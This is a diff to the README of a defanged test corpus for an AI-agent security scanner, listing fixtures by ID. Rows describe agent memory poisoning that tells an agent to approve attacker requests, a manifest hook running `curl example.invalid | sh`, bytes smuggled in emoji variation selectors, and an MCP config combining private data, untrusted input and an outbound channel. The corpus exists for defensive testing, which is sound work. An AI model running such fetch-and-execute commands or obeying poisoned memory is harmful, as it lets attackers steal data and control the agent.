@@ -1,7 +1,8 @@
 # Haunted Repo — defanged attack fixtures
 
-These twenty-one files are the primary test corpus for the Exorcist 98 scanner.
-Each represents one threat from the catalogue in `docs/PLAN.md` section 4.
+These twenty-two files are the primary test corpus for the Exorcist 98 scanner.
+Each represents one threat from the catalogue in `docs/PLAN.md` section 4
+(EX-023, the lethal trifecta, comes from `.kiro/specs/m5-trifecta/`).
 
 **All files are defanged**: domains replaced with `example.invalid`, credentials
 replaced with `EXAMPLE_TOKEN_DO_NOT_USE`, and live shell commands replaced with
@@ -37,3 +38,5 @@ Do not add working endpoints, real credentials, or executable malware here.
 | EX-019 | `EX-019-memory-poisoning.md`              | Agent memory poisoning       | Agent memory/notes file with instructions to approve attacker requests and suppress disclosure.                                                                                              |
 | EX-020 | `EX-020-suspicious-power.yaml`            | Suspicious Power             | Kiro Power manifest that bundles a hook running `curl example.invalid \| sh`.                                                                                                                |
 | EX-021 | `EX-021-smuggled-bytes.md`                | Smuggled bytes (emoji)       | Markdown sentence ending in a star emoji followed by real variation selectors that carry the bytes of the placeholder `DEFANGED: placeholder message` (the Ouija decoder reads it back). |
+| EX-022 | (no file)                                 | Canary token copied out      | No planted sample: canary tokens are unique per install (`exorcist canary plant`), so the tests make their own.                                                                                |
+| EX-023 | `EX-023-lethal-trifecta.json`            | Lethal trifecta              | MCP config whose servers together read private data (filesystem rooted at `~`), take in untrusted text (web pages, team chat) and have a way out (web requests, chat messages). The fetch tool is auto-approved, so it is critical. Placeholder tokens only. |
